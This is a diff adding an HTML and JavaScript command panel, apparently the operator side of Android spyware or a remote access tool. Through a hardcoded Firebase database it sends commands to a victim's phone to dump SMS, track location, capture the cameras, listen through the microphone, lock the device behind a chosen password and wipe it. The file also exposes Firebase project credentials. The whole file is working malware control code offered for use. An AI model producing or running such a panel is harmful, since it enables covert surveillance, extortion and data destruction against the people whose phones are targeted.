@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYLEX-CODER | COMMAND CENTER</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
+        .container { max-width: 900px; margin: auto; border: 1px solid #00ff00; padding: 20px; box-shadow: 0 0 15px #00ff00; }
+        h1 { text-align: center; text-transform: uppercase; letter-spacing: 5px; border-bottom: 2px solid #00ff00; padding-bottom: 10px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 20px; }
+        .card { border: 1px solid #333; padding: 15px; background: #111; border-radius: 5px; }
+        button { width: 100%; padding: 10px; margin: 5px 0; border: none; background: #00ff00; color: #000; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #ff0000; color: #fff; }
+        button:active { transform: scale(0.95); }
+        .status { color: #fff; font-size: 0.8em; margin-top: 10px; background: #222; padding: 10px; height: 100px; overflow-y: scroll; border-left: 3px solid #ff0000; }
+        input { width: 90%; padding: 5px; background: #222; color: #fff; border: 1px solid #00ff00; margin-bottom: 5px; }
+        .toggle-btn { background: #444; color: #fff; }
+        .on { background: #00ff00 !important; color: #000 !important; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>💀 CYLEX CONTROL PANEL 💀</h1>
+    
+    <div class="grid">
+        <div class="card">
+            <h3>📂 Spy Features</h3>
+            <button onclick="sendCmd('get_sms')">Dump SMS</button>
+            <button onclick="sendCmd('get_loc')">Track Location</button>
+            <button onclick="sendCmd('get_dev_info')">Device Info</button>
+            <button onclick="sendCmd('get_sim')">Check SIM/No</button>
+        </div>
+
+        <div class="card">
+            <h3>📸 Realtime Cam</h3>
+            <button onclick="sendCmd('cap_front')">Front Camera</button>
+            <button onclick="sendCmd('cap_back')">Back Camera</button>
+        </div>
+
+        <div class="card">
+            <h3>🔒 Lock Device</h3>
+            <input type="text" id="lockMsg" placeholder="Custom Teks...">
+            <input type="text" id="lockPass" placeholder="Set Password...">
+            <button id="lockToggle" class="toggle-btn" onclick="toggle('lock')">LOCK: OFF</button>
+            <button onclick="sendCmd('lock_html')">Lock with Custom HTML</button>
+        </div>
+
+        <div class="card">
+            <h3>🎙️ Audio Control</h3>
+            <button onmousedown="sendCmd('voice_to_target_on')" onmouseup="sendCmd('voice_to_target_off')">Hold: Send Voice</button>
+            <button onmousedown="sendCmd('listen_target_on')" onmouseup="sendCmd('listen_target_off')">Hold: Listen Target</button>
+        </div>
+
+        <div class="card">
+            <h3>⚙️ System Hardware</h3>
+            <button id="torchToggle" class="toggle-btn" onclick="toggle('torch')">Flashlight: OFF</button>
+            <button onclick="confirmCmd('restart')">Restart HP</button>
+            <button style="background: #ff0000; color: #fff;" onclick="confirmCmd('reset')">WIPE/RESET HP</button>
+        </div>
+    </div>
+
+    <div class="status" id="logBox">
+        [SYSTEM] Dashboard Ready. Waiting for target...<br>
+    </div>
+</div>
+
+<script>
+    // --- KONFIGURASI FIREBASE ---
+    const firebaseConfig = {
+   apiKey: "AIzaSyD-3mqEy5axmI8SN5e-M7FTvxMZP-1Rhqg",
+
+  authDomain: "hidup-blonde-f0b06.firebaseapp.com",
+
+  databaseURL: "https://hidup-blonde-f0b06-default-rtdb.asia-southeast1.firebasedatabase.app",
+
+  projectId: "hidup-blonde-f0b06",
+
+  storageBucket: "hidup-blonde-f0b06.firebasestorage.app",
+
+  messagingSenderId: "1055173316018",
+
+  appId: "1:1055173316018:web:655117f136e0cd29c4e8ab"
+
+
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Fungsi kirim Command
+    function sendCmd(action) {
+        const msg = document.getElementById('lockMsg').value;
+        const pass = document.getElementById('lockPass').value;
+        
+        db.ref('commands').set({
+            cmd: action,
+            text: msg,
+            password: pass,
+            time: Date.now()
+        });
+        log(`Command Sent: ${action}`);
+    }
+
+    // Fungsi Konfirmasi (Restart/Reset)
+    function confirmCmd(type) {
+        if (confirm(`Yakin mau ${type} HP korban, Goblok?`)) {
+            sendCmd(type);
+        }
+    }
+
+    // Fungsi Toggle (Lock/Senter)
+    let states = { lock: false, torch: false };
+    function toggle(type) {
+        states[type] = !states[type];
+        const btn = document.getElementById(type + 'Toggle');
+        const action = states[type] ? `${type}_on` : `${type}_off`;
+        
+        btn.innerText = `${type.toUpperCase()}: ${states[type] ? 'ON' : 'OFF'}`;
+        btn.classList.toggle('on');
+        sendCmd(action);
+    }
+
+    // Log viewer
+    function log(msg) {
+        const box = document.getElementById('logBox');
+        box.innerHTML += `> [${new Date().toLocaleTimeString()}] ${msg}<br>`;
+        box.scrollTop = box.scrollHeight;
+    }
+
+    // Listen data balik dari target
+    db.ref('logs').on('value', (snap) => {
+        if(snap.exists()) log("Target Response: Data Received.");
+    });
+</script>
+
+</body>
+</html>
